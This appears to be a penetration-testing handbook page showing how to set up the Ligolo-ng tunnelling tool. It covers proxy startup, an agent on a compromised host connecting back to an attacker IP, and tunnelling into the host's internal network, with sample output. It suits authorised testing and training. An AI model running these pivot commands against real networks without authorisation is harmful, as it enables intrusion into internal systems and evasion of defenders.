---
title: "[Bonus] - Ligolo-ng"
type: handbook
weight: 7
---

`Ligolo-Ng` is a lightweight and efficient tool designed to enable penetration testers to establish tunnels through reverse TCP/TLS connections, employing a tun interface. Noteworthy features include its GO-coded nature, VPN-like behavior, customizable proxy, and agents in GO. The tool supports multiple protocols, including ICMP, UDP, SYN stealth scans, OS detection, and DNS Resolution, offering connection speeds of up to 100 Mbits/sec. Ligolo-Ng minimizes maintenance time by avoiding tool residue on disk or in memory.

### Installation

Refer [Ligolo-ng](https://github.com/Nicocha30/ligolo-ng) for complete installation.

### Setting up Ligolo-ng

Install ligolo proxy and ligolo agent from the above resource.

```bash
tar -xvf ligolo-ng-proxy.tar.gz ligolo-ng-agent.tar.gz
```

Before moving forward, you need to create a separate tun interface for ligolo.

```bash {filename="Note"}
Creating tun interface is required every single time we want to use ligolo-ng
```

```bash
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
ip addr show ligolo
```

Run ligolo-ng proxy on the attacker machine:

```bash
sudo ./proxy -selfcert
```

```bash
sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2
```

Run ligolo-ng agent on the pivoting or compromised host:

```bash
./agent -connect <attacker-ip>:<port-from-proxy> --ignore-cert
```

```bash
ubuntu@WEB01:~$ ./agent -connect 10.10.16.42:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.16.42:11601"
```

Once the proxy and agent is running, we need to start session on proxy by following command:

```bash
ligolo-ng >> session
```

```bash
ligolo-ng » INFO[0096] Agent joined.                                 id=005056b08bf9 name=ubuntu@WEB01 remote="10.129.71.91:60908"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - ubuntu@WEB01 - 10.129.71.91:60908 - 005056b08bf9
[Agent : ubuntu@WEB01] » 
```

You can confirm the connection with the jump host or pivoting host by typing `ifconfig` to see the internal network:

```bash
ligolo-ng >> ifconfig
```

```bash
[Agent : ubuntu@WEB01] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
│ IPv6 Address │ ::1/128             │
└──────────────┴─────────────────────┘
┌─────────────────────────────────────────────────┐
│ Interface 1                                     │
├──────────────┬──────────────────────────────────┤
│ Name         │ ens192                           │
│ Hardware MAC │ 00:50:56:b0:8b:f9                │
│ MTU          │ 1500                             │
│ Flags        │ up|broadcast|multicast|running   │
│ IPv4 Address │ 10.129.71.91/16                  │
│ IPv6 Address │ dead:beef::250:56ff:feb0:8bf9/64 │
│ IPv6 Address │ fe80::250:56ff:feb0:8bf9/64      │
└──────────────┴──────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:b0:79:52              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.5.129/23                │
│ IPv6 Address │ fe80::250:56ff:feb0:7952/64    │
└──────────────┴────────────────────────────────┘
[Agent : ubuntu@WEB01] »  
```

To use various tools on internal network, you need to start the tunneling to the pivot host on ligolo-ng proxy.

```bash
[Agent : ubuntu@WEB01] » tunnel_start --tun ligolo
INFO[0718] Starting tunnel to ubuntu@WEB01 (005056b00275) 
```